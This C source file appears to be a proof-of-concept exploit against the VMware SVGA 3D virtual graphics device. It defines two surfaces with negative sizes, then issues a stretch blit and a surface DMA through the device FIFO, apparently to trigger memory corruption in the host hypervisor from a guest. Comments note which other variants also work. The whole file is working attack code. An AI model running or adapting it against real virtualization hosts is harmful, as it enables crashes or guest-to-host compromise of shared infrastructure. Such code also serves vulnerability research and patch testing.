#include <err.h>
#include <stdlib.h>

#include "svga.h"
#include "svga3d_reg.h"

SVGADevice gSVGA;

void defineSurface(uint32_t sid, uint32_t sizeX, uint32_t sizeY, uint32_t sizeZ)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[1] = {0};

	hdr.size = 48;

	surface.sid = sid;
	surface.surfaceFlags = SVGA3D_SURFACE_HINT_STATIC;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 1;
	surface.face[1].numMipLevels = 0;
	surface.face[2].numMipLevels = 0;
	surface.face[3].numMipLevels = 0;
	surface.face[4].numMipLevels = 0;
	surface.face[5].numMipLevels = 0;

	dsize[0].width  = sizeX;
	dsize[0].height = sizeY;
	dsize[0].depth  = sizeZ;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWaitForFB();
}

void stretchblt(uint32_t ssid, uint32_t dsid) {
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdSurfaceStretchBlt blt = {0};
	
	hdr.size = sizeof(blt);

	blt.src.sid = ssid;
	blt.src.face = 0;
	blt.src.mipmap = 0;

	blt.dest.sid = dsid;
	blt.dest.face = 0;
	blt.dest.mipmap = 0;

	blt.boxSrc.w = 1;
	blt.boxSrc.h = 1;
	blt.boxSrc.d = 1;

	blt.boxDest.w = 1;
	blt.boxDest.h = 1;
	blt.boxDest.d = 1;

	blt.mode = SVGA3D_STRETCH_BLT_POINT;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_STRETCHBLT);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(blt.src.sid);
	VMwareWriteWordToFIFO(blt.src.face);
	VMwareWriteWordToFIFO(blt.src.mipmap);
	VMwareWriteWordToFIFO(blt.dest.sid);
	VMwareWriteWordToFIFO(blt.dest.face);
	VMwareWriteWordToFIFO(blt.dest.mipmap);
	VMwareWriteWordToFIFO(blt.boxSrc.x);
	VMwareWriteWordToFIFO(blt.boxSrc.y);
	VMwareWriteWordToFIFO(blt.boxSrc.z);
	VMwareWriteWordToFIFO(blt.boxSrc.w);
	VMwareWriteWordToFIFO(blt.boxSrc.h);
	VMwareWriteWordToFIFO(blt.boxSrc.d);
	VMwareWriteWordToFIFO(blt.boxDest.x);
	VMwareWriteWordToFIFO(blt.boxDest.y);
	VMwareWriteWordToFIFO(blt.boxDest.z);
	VMwareWriteWordToFIFO(blt.boxDest.w);
	VMwareWriteWordToFIFO(blt.boxDest.h);
	VMwareWriteWordToFIFO(blt.boxDest.d);
	VMwareWriteWordToFIFO(blt.mode);

	VMwareWaitForFB();
}

void surfaceDMA(uint32_t sid, SVGA3dTransferType type)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdSurfaceDMA surfacedma = {0};
	SVGA3dCopyBox boxes = {0};

	hdr.size = 64;

	surfacedma.guest.ptr.gmrId  = SVGA_GMR_FRAMEBUFFER;
	surfacedma.guest.ptr.offset = 0;
	surfacedma.guest.pitch      = 0;
	surfacedma.host.sid         = sid;
	surfacedma.host.face        = 0;
	surfacedma.host.mipmap      = 0;
	surfacedma.transfer         = type;

	boxes.x = 0;
	boxes.y = 0;
	boxes.z = 0;
	boxes.w = 1;
	boxes.h = 1;
	boxes.d = 1;
	boxes.srcx = 0;
	boxes.srcy = 0;
	boxes.srcz = 0;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DMA);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.gmrId);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.offset);
	VMwareWriteWordToFIFO(surfacedma.guest.pitch);
	VMwareWriteWordToFIFO(surfacedma.host.sid);
	VMwareWriteWordToFIFO(surfacedma.host.face);
	VMwareWriteWordToFIFO(surfacedma.host.mipmap);
	VMwareWriteWordToFIFO(surfacedma.transfer);
	VMwareWriteWordToFIFO(boxes.x);
	VMwareWriteWordToFIFO(boxes.y);
	VMwareWriteWordToFIFO(boxes.z);
	VMwareWriteWordToFIFO(boxes.w);
	VMwareWriteWordToFIFO(boxes.h);
	VMwareWriteWordToFIFO(boxes.d);
	VMwareWriteWordToFIFO(boxes.srcx);
	VMwareWriteWordToFIFO(boxes.srcy);
	VMwareWriteWordToFIFO(boxes.srcz);

	VMwareWaitForFB();
}

int main(int argc, char **argv)
{
	if (conf_svga_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x258);
	SVGA_WriteReg(SVGA_REG_BITS_PER_PIXEL, 32);
	
	warnx("[+] Allocating two surfaces");
	defineSurface(0, -1, -1, -1); // any negative sizes also work
	defineSurface(1, -1, -1, -1); // any negative sizes also work

	warnx("[+] Running stretch blt");
	stretchblt(0, 1); // texture binding to both surfaces

	warnx("[+] Running surface DMA");
	surfaceDMA(0, SVGA3D_READ_HOST_VRAM); // SVGA3D_WRITE_HOST_VRAM also works

	return 0;
}
